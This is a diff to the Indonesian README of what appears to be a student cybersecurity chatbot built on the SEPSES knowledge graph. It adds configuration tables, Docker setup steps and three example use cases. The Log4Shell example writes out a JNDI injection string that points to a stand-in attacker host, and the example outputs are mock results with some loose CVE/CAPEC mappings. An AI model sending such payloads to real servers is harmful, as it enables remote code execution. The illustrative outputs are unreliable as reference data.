@@ -88,6 +88,56 @@ copy .env.example .env
 # Edit .env dengan API key dan konfigurasi yang sesuai
 ```
 
+#### Referensi Variabel Environment (`.env.example`)
+
+Berikut adalah seluruh variabel yang tersedia di `.env.example`. Salin file tersebut menjadi `.env`, lalu isi nilainya sesuai kebutuhan.
+
+> **⚠️ PENTING:** File `.env` berisi secret (API key). **JANGAN** pernah commit file `.env` ke repository. File ini sudah tercantum di `.gitignore`.
+
+**1. OpenRouter Configuration (Unified LLM Access)**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `OPENROUTER_API_KEY` | ✅ | — | API key untuk akses LLM via OpenRouter. Dapatkan di [openrouter.ai/keys](https://openrouter.ai/keys). |
+| `OPENROUTER_MODEL` | ❌ | `openai/gpt-4o-mini` | Model LLM yang digunakan untuk chat/RAG pipeline. Lihat [daftar model](https://openrouter.ai/models) untuk opsi lengkap. Contoh: `google/gemini-flash-latest`, `anthropic/claude-3.5-sonnet`, `meta-llama/llama-3-70b-instruct`. |
+
+**2. SEPSES SPARQL Endpoint**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `SPARQL_ENDPOINT` | ❌ | `https://w3id.org/sepses/sparql` | URL endpoint SPARQL publik SEPSES. Digunakan untuk query CVE, CWE, CAPEC, CPE, dan ATT&CK. |
+| `SPARQL_TIMEOUT_SECONDS` | ❌ | `30` | Batas waktu (detik) untuk setiap SPARQL query sebelum timeout. |
+
+**3. Apache Jena Fuseki (Local Fallback)**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `FUSEKI_ENDPOINT` | ❌ | `http://localhost:3030/sepses/sparql` | URL endpoint SPARQL Fuseki lokal. Digunakan sebagai fallback jika endpoint publik SEPSES tidak tersedia. |
+| `FUSEKI_UPDATE_ENDPOINT` | ❌ | `http://localhost:3030/sepses/update` | URL endpoint SPARQL Update Fuseki lokal untuk operasi write (insert/update data RDF). |
+
+**4. ChromaDB Vector Store**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `CHROMA_DB_PATH` | ❌ | `./data/chroma_db` | Path direktori penyimpanan persistent ChromaDB untuk vector embeddings. |
+| `CHROMA_COLLECTION_LOGS` | ❌ | `security_logs` | Nama collection ChromaDB yang digunakan untuk menyimpan log keamanan yang sudah di-embed. |
+| `EMBEDDING_MODEL` | ❌ | `sentence-transformers/all-MiniLM-L6-v2` | Model embedding dari HuggingFace untuk konversi teks ke vektor. Model ini digunakan oleh ChromaDB untuk semantic search. |
+
+**5. Evaluation Settings**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `JUDGE_MODEL` | ❌ | `gpt-4o-mini` | Model LLM yang digunakan sebagai *judge* dalam framework **LLM-as-a-Judge** untuk menilai kualitas respons chatbot. |
+| `EVAL_RESULTS_DIR` | ❌ | `./evaluation/results` | Path direktori output hasil evaluasi (skor, laporan, dan grafik). |
+
+**6. Application Settings**
+
+| Variabel | Wajib | Default | Deskripsi |
+|----------|:-----:|---------|-----------|
+| `LOG_LEVEL` | ❌ | `INFO` | Level logging aplikasi. Opsi: `DEBUG`, `INFO`, `WARNING`, `ERROR`, `CRITICAL`. |
+| `MAX_CONTEXT_TOKENS` | ❌ | `4000` | Jumlah maksimal token konteks yang dikirim ke LLM dalam satu request. Mengatur trade-off antara kelengkapan konteks vs biaya/kecepatan. |
+| `TOP_K_RETRIEVAL` | ❌ | `5` | Jumlah dokumen/chunk teratas yang diambil dari vector store saat retrieval. Nilai lebih tinggi = konteks lebih lengkap, tapi lebih lambat. |
+
 ### 3. Jalankan Aplikasi
 
 ```bash
@@ -106,7 +156,139 @@ python evaluation/run_eval.py --llm openai/gpt-4o-mini anthropic/claude-3.5-sonn
 
 ---
 
-## 📁 Struktur Proyek
+## Quick Start with Docker
+
+Cara tercepat untuk menjalankan seluruh stack (Fuseki SPARQL triplestore + Streamlit chatbot) tanpa setup manual Python environment.
+
+### Prerequisites
+
+| Komponen | Versi Minimum | Link Download |
+|----------|--------------|---------------|
+| **Docker Engine** | 20.10+ | [docs.docker.com/engine/install](https://docs.docker.com/engine/install/) |
+| **Docker Compose** | v2.0+ (built-in di Docker Desktop) | Sudah termasuk di Docker Desktop |
+| **OpenRouter API Key** | — | [openrouter.ai/keys](https://openrouter.ai/keys) |
+
+> **Note:** Pada Windows dan macOS, cukup install [Docker Desktop](https://www.docker.com/products/docker-desktop/) yang sudah menyertakan Docker Engine dan Docker Compose.
+
+### 1. Clone & Konfigurasi Environment
+
+```bash
+# Clone repository
+git clone https://github.com/Software-Engineering-2026-Class/SEPSES-CSKG-LLM-Chatbot-Kelompok-5.git
+cd SEPSES-CSKG-LLM-Chatbot-Kelompok-5
+
+# Salin template environment variables
+cp .env.example .env     # Linux/macOS
+copy .env.example .env   # Windows (CMD)
+```
+
+Edit file `.env` dan isi minimal konfigurasi berikut:
+
+```env
+# [WAJIB] API key untuk akses LLM via OpenRouter
+OPENROUTER_API_KEY=sk-or-v1-your-actual-api-key
+
+# [OPSIONAL] Ganti model LLM sesuai kebutuhan (default: gpt-4o-mini)
+OPENROUTER_MODEL=openai/gpt-4o-mini
+```
+
+### 2. Jalankan dengan Docker Compose
+
+```bash
+# Jalankan semua services (Fuseki + Chatbot)
+docker compose up -d
+
+# Atau jalankan hanya SPARQL triplestore (untuk development lokal)
+docker compose up fuseki -d
+```
+
+### 3. Akses Aplikasi
+
+| Service | URL | Deskripsi |
+|---------|-----|-----------|
+| **Streamlit Chatbot** | [http://localhost:8501](http://localhost:8501) | Antarmuka chatbot utama |
+| **Fuseki Admin Panel** | [http://localhost:3030](http://localhost:3030) | SPARQL triplestore admin (user: `admin`, password: sesuai `FUSEKI_ADMIN_PASSWORD` di `.env`, default: `admin123`) |
+
+### 4. Verifikasi Health Check
+
+```bash
+# Cek status semua container
+docker compose ps
+
+# Cek health Fuseki endpoint
+curl http://localhost:3030/$/ping
+
+# Cek log chatbot
+docker compose logs chatbot --tail 50
+
+# Cek log Fuseki
+docker compose logs fuseki --tail 50
+```
+
+### Docker Service Architecture
+
+```
+┌─────────────────────────────────────────────────┐
+│              Docker Compose Network             │
+│                                                 │
+│  ┌──────────────┐       ┌────────────────────┐  │
+│  │   fuseki     │       │     chatbot        │  │
+│  │  (Jena 4.9)  │◄──────│  (Python 3.10)     │  │
+│  │  Port: 3030  │       │  Port: 8501        │  │
+│  │              │       │                    │  │
+│  │  SPARQL      │       │  Streamlit App     │  │
+│  │  Triplestore │       │  + RAG Pipeline    │  │
+│  └──────────────┘       │  + ChromaDB        │  │
+│        ▲                └────────────────────┘  │
+│        │                          │             │
+│   fuseki_data                  ./data           │
+│   (Docker Volume)          (Bind Mount)         │
+└─────────────────────────────────────────────────┘
+         │                          │
+    ┌────┴────┐              ┌──────┴──────┐
+    │ :3030   │              │   :8501     │
+    │ Fuseki  │              │  Streamlit  │
+    │  Admin  │              │  Chatbot UI │
+    └─────────┘              └─────────────┘
+         Host Machine (localhost)
+```
+
+### Docker Commands
+
+```bash
+# Hentikan semua services
+docker compose down
+
+# Hentikan dan hapus volumes (reset data Fuseki)
+docker compose down -v
+
+# Rebuild image chatbot (setelah update kode/dependencies)
+docker compose build chatbot
+
+# Rebuild dan jalankan ulang
+docker compose up -d --build
+
+# Masuk ke shell container chatbot (debugging)
+docker exec -it sepses_chatbot bash
+
+# Lihat resource usage
+docker stats sepses_chatbot sepses_fuseki
+```
+
+### Troubleshooting Docker
+
+| Masalah | Solusi |
+|---------|--------|
+| Port `8501` sudah digunakan | Ubah port mapping di `docker-compose.yml`: `"8502:8501"` |
+| Port `3030` sudah digunakan | Ubah port mapping di `docker-compose.yml`: `"3031:3030"` |
+| Chatbot gagal start | Pastikan `.env` sudah terisi dengan benar, cek `docker compose logs chatbot` |
+| Fuseki unhealthy | Cek memory: Fuseki butuh minimal ~2GB RAM (`JVM_ARGS=-Xmx2g`) |
+| Build lambat | Build pertama kali akan mengunduh embedding model (~90MB). Build berikutnya akan lebih cepat berkat Docker cache |
+| Permission denied (Linux) | Jalankan dengan `sudo` atau tambahkan user ke group docker: `sudo usermod -aG docker $USER` |
+
+---
+
+## Struktur Proyek
 
 ```
 SEPSES-CSKG-LLM-Chatbot/
@@ -170,6 +352,233 @@ SEPSES-CSKG-LLM-Chatbot/
 | KG QA | Question-answering langsung atas SEPSES CSKG |
 | Graph Visualization | Visualisasi interaktif relasi entitas KG |
 | Multi-LLM Evaluation | Perbandingan berbagai model LLM via OpenRouter |
+
+---
+
+## Contoh Use-Case
+
+Berikut adalah 3 contoh use-case utama yang menunjukkan bagaimana sistem memproses pertanyaan pengguna melalui pipeline Hybrid RAG + GraphRAG.
+
+### Use-Case 1: Security Analysis — Analisis Kerentanan CVE
+
+**Deskripsi:** Pengguna memasukkan CVE ID spesifik untuk mendapatkan analisis keamanan komprehensif. Sistem melakukan multi-hop traversal pada Knowledge Graph (`CVE → CWE → CAPEC → ATT&CK`) dan menghasilkan laporan terstruktur.
+
+**Mode Pipeline:** `Security Analysis`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Analisis kerentanan CVE-2021-44228 dan berikan rekomendasi mitigasi
+```
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. Pipeline mendeteksi CVE ID `CVE-2021-44228` dari teks pertanyaan
+2. Multi-hop traversal SPARQL ke SEPSES KG:
+   ```
+   CVE-2021-44228 → CWE-917 (Expression Language Injection)
+                   → CWE-20 (Improper Input Validation)
+                   → CAPEC-135 (Format String Injection)
+                   → ATT&CK Technique
+   ```
+3. Mengambil CVSS score, attack vector, dan affected products (CPE)
+4. LLM menyusun respons berdasarkan konteks KG
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+## Summary
+CVE-2021-44228 (Log4Shell) adalah kerentanan critical (CVSS 10.0) pada
+Apache Log4j 2.x yang memungkinkan Remote Code Execution melalui JNDI
+injection pada log messages.
+
+## Vulnerability Details
+- **CVE ID:** CVE-2021-44228
+- **CVSS Score:** 10.0 (Critical)
+- **Attack Vector:** Network
+- **CWE:** CWE-917 — Improper Neutralization of Special Elements used
+  in an Expression Language Statement
+- **CAPEC:** CAPEC-135 — Format String Injection
+
+## Risk Assessment
+Skor CVSS 10.0 menunjukkan risiko tertinggi. Serangan dapat dilakukan
+secara remote tanpa autentikasi melalui input string yang diproses
+oleh Log4j.
+
+## Attack Chain
+1. Attacker mengirim crafted string `${jndi:ldap://attacker.com/a}`
+2. Log4j memproses string dan melakukan JNDI lookup
+3. Server korban mengunduh dan mengeksekusi malicious class
+4. Attacker mendapat Remote Code Execution pada server
+
+## Recommendations
+1. Upgrade ke Apache Log4j ≥ 2.17.1
+2. Set property `log4j2.formatMsgNoLookups=true`
+3. Blokir outbound LDAP/RMI traffic di firewall
+4. Scan semua aplikasi untuk dependensi Log4j vulnerable
+
+## KG Sources
+- SEPSES CVE: http://w3id.org/sepses/resource/cve/CVE-2021-44228
+- SEPSES CWE: http://w3id.org/sepses/resource/cwe/CWE-917
+- SEPSES CAPEC: http://w3id.org/sepses/resource/capec/CAPEC-135
+```
+</td>
+</tr>
+</table>
+
+---
+
+### Use-Case 2: Log Analysis — Investigasi Log Keamanan
+
+**Deskripsi:** Pengguna mengunggah file log keamanan (Snort/Syslog/Windows Event) dan mengajukan pertanyaan tentang ancaman yang terdeteksi. Sistem melakukan semantic search pada ChromaDB lalu memperkaya temuan dengan data dari Knowledge Graph.
+
+**Mode Pipeline:** `Log Analysis`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Apakah ada indikasi serangan brute-force pada log ini? Identifikasi
+sumber dan target serangan.
+```
+
+*Catatan: log Snort/Syslog sudah diunggah sebelumnya ke ChromaDB.*
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. Hybrid retrieval (BM25 + Semantic + RRF fusion) dari ChromaDB mengambil top-5 log entry yang relevan dengan "brute-force"
+2. Hasil retrieval:
+   ```
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Failed SSH login attempt (attempt 47/50)
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Failed SSH login attempt (attempt 48/50)
+   [CRITICAL] Src: 192.168.1.105 → Dst: 10.0.0.5 | SSH brute-force threshold exceeded
+   [MEDIUM] Src: 192.168.1.105 → Dst: 10.0.0.8 | Port scan detected (22, 80, 443, 3389)
+   [HIGH] Src: 192.168.1.105 → Dst: 10.0.0.5 | Successful SSH login after 49 failures
+   ```
+3. Pipeline mendeteksi potensi CVE terkait (jika ada) lalu melakukan KG enrichment
+4. LLM menganalisis pola serangan dan memberikan rekomendasi
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+## Detected Threats
+| # | Severity | Deskripsi |
+|---|----------|-----------|
+| 1 | CRITICAL | SSH brute-force attack berhasil — login sukses setelah 49 percobaan gagal |
+| 2 | MEDIUM | Port scanning dari IP yang sama terhadap multiple hosts |
+
+## Attack Stage (MITRE ATT&CK)
+- **Tactic:** Initial Access (TA0001)
+- **Technique:** T1110.001 — Brute Force: Password Guessing
+- **Sub-activity:** Port scanning menunjukkan fase Reconnaissance (TA0043)
+
+## Affected Systems
+- **Attacker IP:** 192.168.1.105
+- **Primary Target:** 10.0.0.5 (SSH service, port 22) — COMPROMISED
+- **Secondary Target:** 10.0.0.8 (port scan, belum ada indikasi compromise)
+
+## Immediate Actions
+1. **Isolasi** host 10.0.0.5 — kemungkinan sudah compromised
+2. **Block** IP 192.168.1.105 di firewall (ingress + egress)
+3. **Audit** akun SSH yang berhasil login — reset password & revoke session
+4. **Implementasi** fail2ban / account lockout policy (max 5 attempts)
+5. **Migrasi** ke SSH key-based authentication, disable password login
+```
+</td>
+</tr>
+</table>
+
+---
+
+### Use-Case 3: KG Question Answering — Query Langsung ke Knowledge Graph
+
+**Deskripsi:** Pengguna mengajukan pertanyaan dalam bahasa natural tentang data di SEPSES Knowledge Graph. Sistem mengonversi pertanyaan menjadi SPARQL query (NL2SPARQL), mengeksekusinya ke SEPSES endpoint, lalu menyajikan jawaban dalam bahasa natural.
+
+**Mode Pipeline:** `KG Question Answering`
+
+<table>
+<tr><th width="100">Aspek</th><th>Detail</th></tr>
+<tr>
+<td><strong>Input</strong></td>
+<td>
+
+```
+Cari semua CVE critical (CVSS ≥ 9.0) yang mempengaruhi produk Apache
+```
+</td>
+</tr>
+<tr>
+<td><strong>Proses</strong></td>
+<td>
+
+1. NL2SPARQL mengonversi pertanyaan menjadi SPARQL query:
+   ```sparql
+   PREFIX cve:  <http://w3id.org/sepses/vocab/ref/cve#>
+   PREFIX cpe:  <http://w3id.org/sepses/vocab/ref/cpe#>
+   PREFIX cvss: <http://w3id.org/sepses/vocab/ref/cvss#>
+   SELECT ?cveId ?score ?product WHERE {
+     ?cve cve:cveId  ?cveId ;
+          cve:hasCPE ?cpe ;
+          cve:hasCVSS ?cvssNode .
+     ?cpe cpe:productId ?product .
+     ?cvssNode cvss:baseScore ?score .
+     FILTER(CONTAINS(LCASE(STR(?product)), "apache"))
+     FILTER(?score >= 9.0)
+   } ORDER BY DESC(?score) LIMIT 20
+   ```
+2. Query dieksekusi ke endpoint `https://w3id.org/sepses/sparql`
+3. Hasil (max 20 rows) diformat dan dikirim ke LLM sebagai konteks
+4. LLM menyusun jawaban berbasis data KG
+</td>
+</tr>
+<tr>
+<td><strong>Output</strong></td>
+<td>
+
+```markdown
+Berdasarkan data dari SEPSES Cybersecurity Knowledge Graph, berikut
+adalah CVE critical (CVSS ≥ 9.0) yang mempengaruhi produk Apache:
+
+| # | CVE ID | CVSS Score | Affected Product |
+|---|--------|:----------:|------------------|
+| 1 | CVE-2021-44228 | 10.0 | apache:log4j |
+| 2 | CVE-2021-41773 | 9.8  | apache:http_server |
+| 3 | CVE-2023-25690 | 9.8  | apache:http_server |
+| 4 | CVE-2022-22965 | 9.8  | apache:tomcat |
+| 5 | CVE-2023-46604 | 9.8  | apache:activemq |
+| ... | ... | ... | ... |
+
+**Temuan Utama:**
+- Total **15 CVE critical** ditemukan pada produk Apache
+- Produk paling banyak terdampak: **Apache HTTP Server** (6 CVE)
+- CVE dengan skor tertinggi: **CVE-2021-44228** (Log4Shell, CVSS 10.0)
+
+**SPARQL Query Used:**
+Query telah dieksekusi melalui NL2SPARQL conversion terhadap
+endpoint SEPSES (https://w3id.org/sepses/sparql)
+```
+</td>
+</tr>
+</table>
 
 ---
 
